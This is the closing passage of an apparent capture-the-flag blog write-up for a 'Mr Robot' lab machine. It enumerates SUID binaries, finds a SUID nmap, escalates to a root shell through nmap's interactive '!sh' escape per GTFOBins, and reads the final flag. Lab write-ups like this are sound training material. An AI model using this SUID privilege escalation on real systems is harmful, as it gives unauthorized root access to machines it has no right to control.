+find / <span class="nt">-perm</span> <span class="nt">-u</span><span class="o">=</span>s <span class="nt">-type</span> f 2&gt;/dev/null
+/bin/ping
+/bin/umount
+/bin/mount
+/bin/ping6
+/bin/su
+/usr/bin/passwd
+/usr/bin/newgrp
+/usr/bin/chsh
+/usr/bin/chfn
+/usr/bin/gpasswd
+/usr/bin/sudo
+/usr/local/bin/nmap
+/usr/lib/openssh/ssh-keysign
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
+/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
+/usr/lib/pt_chown
+</code></pre></div></div> <p><br> I have done this in the past but we will check the GTFOBins just to double-check.</p> <div class="row justify-content-sm-center"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/mrrobot/gtfobins.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="GTFOBins" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </div> </div> <p><a href="https://gtfobins.github.io/gtfobins/nmap/" rel="external nofollow noopener" target="_blank">https://gtfobins.github.io/gtfobins/nmap/</a></p> <p><br> Enter into nmap interactive mode and drop into a shell.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Starting nmap V. 3.81 <span class="o">(</span> http://www.insecure.org/nmap/ <span class="o">)</span>
+Welcome to Interactive Mode <span class="nt">--</span> press h &lt;enter&gt; <span class="k">for </span><span class="nb">help
+</span>nmap&gt; <span class="o">!</span>sh 
+<span class="o">!</span>sh
+<span class="c"># whoami</span>
+<span class="nb">whoami
+</span>root
+</code></pre></div></div> <p><br> Get the last flag.</p> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># cat key-3-of-3.txt</span>
+<span class="nb">cat </span>key-3-of-3.txt
+&lt;redacted&gt;
+<span class="c"># ip a</span>
+ip a
+1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default 
+    <span class="nb">link</span>/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+    inet 127.0.0.1/8 scope host lo
+       valid_lft forever preferred_lft forever
+    inet6 ::1/128 scope host 
+       valid_lft forever preferred_lft forever
+2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 9001 qdisc pfifo_fast state UP group default qlen 1000
+    <span class="nb">link</span>/ether 02:f7:48:be:30:fd brd ff:ff:ff:ff:ff:ff
+    inet 10.10.145.112/16 brd 10.10.255.255 scope global eth0
+       valid_lft forever preferred_lft forever
+    inet6 fe80::f7:48ff:febe:30fd/64 scope <span class="nb">link 
+       </span>valid_lft forever preferred_lft forever
+</code></pre></div></div> <p><br> Domo Arigato Mr. Roboto! Thanks for the box!</p> </article> </div> </div> <footer class="fixed-bottom" role="contentinfo"> <div class="container mt-0"> © Copyright 2025 Biscotti Diskette. Powered by <a href="https://jekyllrb.com/" target="_blank" rel="external nofollow noopener">Jekyll</a> with <a href="https://github.com/alshedivat/al-folio" rel="external nofollow noopener" target="_blank">al-folio</a> theme. Hosted by <a href="https://pages.github.com/" target="_blank" rel="external nofollow noopener">GitHub Pages</a>. </div> </footer> <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script> <script src="/assets/js/bootstrap.bundle.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/mdbootstrap@4.20.0/js/mdb.min.js" integrity="sha256-NdbiivsvWt7VYCt6hYNT3h/th9vSTL4EDWeGs5SN3DA=" crossorigin="anonymous"></script> <script defer src="https://cdn.jsdelivr.net/npm/masonry-layout@4.2.2/dist/masonry.pkgd.min.js" integrity="sha256-Nn1q/fx0H7SNLZMQ5Hw5JLaTRZp0yILA/FRexe19VdI=" crossorigin="anonymous"></script> <script defer src="https://cdn.jsdelivr.net/npm/imagesloaded@5.0.0/imagesloaded.pkgd.min.js" integrity="sha256-htrLFfZJ6v5udOG+3kNLINIKh2gvoKqwEhHYfTTMICc=" crossorigin="anonymous"></script> <script defer src="/assets/js/masonry.js?a0db7e5d5c70cc3252b3138b0c91dcaf" type="text/javascript"></script> <script defer src="https://cdn.jsdelivr.net/npm/medium-zoom@1.1.0/dist/medium-zoom.min.js" integrity="sha256-ZgMyDAIYDYGxbcpJcfUnYwNevG/xi9OHKaR/8GK+jWc=" crossorigin="anonymous"></script> <script defer src="/assets/js/zoom.js?85ddb88934d28b74e78031fd54cf8308"></script> <script src="/assets/js/no_defer.js?2781658a0a2b13ed609542042a859126"></script> <script defer src="/assets/js/common.js?e0514a05c5c95ac1a93a8dfd5249b92e"></script> <script defer src="/assets/js/copy_code.js?12775fdf7f95e901d7119054556e495f" type="text/javascript"></script> <script defer src="/assets/js/jupyter_new_tab.js?d9f17b6adc2311cbabd747f4538bb15f"></script> <script async src="https://d1bxh8uas1mnw7.cloudfront.net/assets/embed.js"></script> <script async src="https://badge.dimensions.ai/badge.js"></script> <script defer type="text/javascript" id="MathJax-script" src="https://cdn.jsdelivr.net/npm/mathjax@3.2.2/es5/tex-mml-chtml.js" integrity="sha256-MASABpB4tYktI2Oitl4t+78w/lyA+D7b/s9GEP0JOGI=" crossorigin="anonymous"></script> <script src="/assets/js/mathjax-setup.js?70d799092f862ad98c7876aa47712e20"></script> <script defer src="https://cdnjs.cloudflare.com/polyfill/v3/polyfill.min.js?features=es6" crossorigin="anonymous"></script> <script defer src="/assets/js/progress-bar.js?2f30e0e6801ea8f5036fa66e1ab0a71a" type="text/javascript"></script> <script src="/assets/js/vanilla-back-to-top.min.js?f40d453793ff4f64e238e420181a1d17"></script> <script>
+    addBackToTop();
+  </script> </body> </html>
